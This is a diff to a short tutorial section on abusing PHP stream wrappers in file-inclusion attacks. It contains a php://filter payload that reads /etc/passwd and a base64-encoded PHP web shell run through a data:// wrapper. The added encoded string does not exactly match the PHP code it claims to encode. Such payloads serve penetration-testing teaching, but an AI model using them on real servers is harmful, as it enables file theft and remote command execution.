@@ -3,7 +3,7 @@ PHP wrappers are part of PHP's functionality that allows users access to various
 ```php
 php://filter/convert.base64-encode/resource=/etc/passwd
 ```
-Once the application processes this payload, the server will return an encoded content of the passwd file. Then decode the base64 encoded data. PHP wrappers can also be used not only for reading files but also for ```code execution```. We will use the PHP code ```<?php system($_GET['cmd']); echo 'Shell done!'; ?>``` as our payload. The value of the payload, when encoded to base64, will be 
+Once the application processes this payload, the server will return an encoded content of the passwd file. Then decode the base64 encoded data. PHP wrappers can also be used not only for reading files but also for ```code execution```. We will use the PHP code ```<?php system($_GET['cmd']); echo 'Shell done!'; ?>``` as our payload and ```PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+``` is the encoded base64 format of the PHP code. The full value of the payload, when encoded to base64, will be 
 ```
 php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
 ```
